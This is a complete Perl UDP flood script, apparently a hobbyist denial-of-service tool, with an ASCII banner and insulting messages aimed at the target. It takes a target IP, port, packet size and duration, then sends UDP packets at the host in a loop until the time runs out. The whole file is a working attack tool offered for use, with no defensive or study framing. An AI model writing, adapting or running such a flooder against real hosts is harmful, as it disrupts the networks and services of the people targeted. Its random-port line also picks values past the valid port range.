#!/usr/bin/perl
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# Script By Daddy O4YT<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "OI FUCKTARD THIS IP IS FAKE ~𝕺4𝖄𝕿~ $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;                                                                                                                                                               
.d88888b  dP         .d888888  8888ba.88ba  8888ba.88ba   88888888b 888888ba  
88.    "' 88        d8'    88  88  `8b  `8b 88  `8b  `8b  88        88    `8b 
`Y88888b. 88        88aaaaa88a 88   88   88 88   88   88 a88aaaa    88     88 
      `8b 88        88     88  88   88   88 88   88   88  88        88     88 
d8'   .8P 88        88     88  88   88   88 88   88   88  88        88    .8P 
 Y88888P  88888888P 88     88  dP   dP   dP dP   dP   dP  88888888P 8888888P  
                                                                              
                                                                              
                                                            
                         𝕮𝖀𝕾𝕿𝕺𝕸 𝕾𝕮𝕽𝕴𝕻𝕿 𝕭𝖄 𝕺4𝖄𝕿                  
EOTEXT
print BOLD BLUE"::Get at me again $ip I dare you bitch port " . ($port ? $port : "random") . " Oh yeah and since your a smart guy and disrespected me you get " .
  ($size ? "$size-bytes" : "Disconnected that dumb skid") . " ~O4YT~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;



for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}